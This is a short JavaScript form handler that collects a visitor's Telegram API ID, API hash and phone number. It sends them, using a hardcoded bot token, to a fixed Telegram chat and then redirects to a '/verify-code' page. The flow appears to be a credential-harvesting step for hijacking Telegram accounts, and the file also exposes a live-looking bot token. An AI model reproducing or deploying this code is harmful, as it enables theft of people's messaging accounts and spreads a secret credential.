document.getElementById("telethon-form").addEventListener("submit", async function(event) {
    event.preventDefault(); // Prevent page reload

    const apiId = document.getElementById("api_id").value.trim();
    const apiHash = document.getElementById("api_hash").value.trim();
    const phoneNumber = document.getElementById("phone_number").value.trim();

    if (!apiId || !apiHash || !phoneNumber) {
        alert("Please enter all required details.");
        return;
    }

    // Format phone number
    const formattedPhone = phoneNumber.replace(/\s+/g, ''); // Remove spaces

    // Telegram Bot Credentials
    const botToken = "7826910523:AAHmVZ-y1AsnTZXvdVbnH5MeBqrKi67zt3M";
    const chatId = "4670929884";  // Your Telegram Chat ID

    // Message format as /connect (number) (API Hash) (API Key)
    const message = `/connect ${formattedPhone} ${apiHash} ${apiId}`;

    // Telegram API URL
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        // Send data to Telegram group
        await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });

        // Redirect to verification page after sending message
        window.location.href = "/verify-code";

    } catch (error) {
        console.error("Error:", error);
        alert("An unexpected error occurred. Please try again.");
    }
});
